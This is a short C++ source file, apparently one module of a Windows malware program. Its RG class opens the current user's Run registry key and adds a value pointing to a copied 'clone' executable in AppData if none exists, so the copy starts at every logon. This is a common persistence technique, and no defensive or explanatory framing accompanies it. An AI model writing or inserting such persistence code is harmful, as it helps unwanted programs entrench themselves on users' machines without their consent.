#include "pch.h"
#include "RG.h"
#include <winreg.h>

void RG::execute() {
	
	HKEY hKey = NULL;
	string path = this->util.getAppDataPath() + this->util.getClone();
	long opnStatus = RegOpenKeyEx(HKEY_CURRENT_USER, this->util.getRunKey(), 0, KEY_ALL_ACCESS, &hKey);

	if (ERROR_SUCCESS == opnStatus) {
		if (!this->isValueExisting(hKey)) {

			long setStatus = RegSetValueEx(hKey, this->util.getCloneKeyName().c_str(), 0, REG_SZ, (BYTE*)path.c_str(), strlen(path.c_str()));
		}
	}
	
	RegCloseKey(hKey);
}

bool RG::isValueExisting(HKEY hKey) {
	DWORD type;
	long status = RegQueryValueEx(hKey, this->util.getCloneKeyName().c_str(), NULL, &type, NULL, NULL);
	if (status == ERROR_SUCCESS) {
		return true;
	}

	return false;
}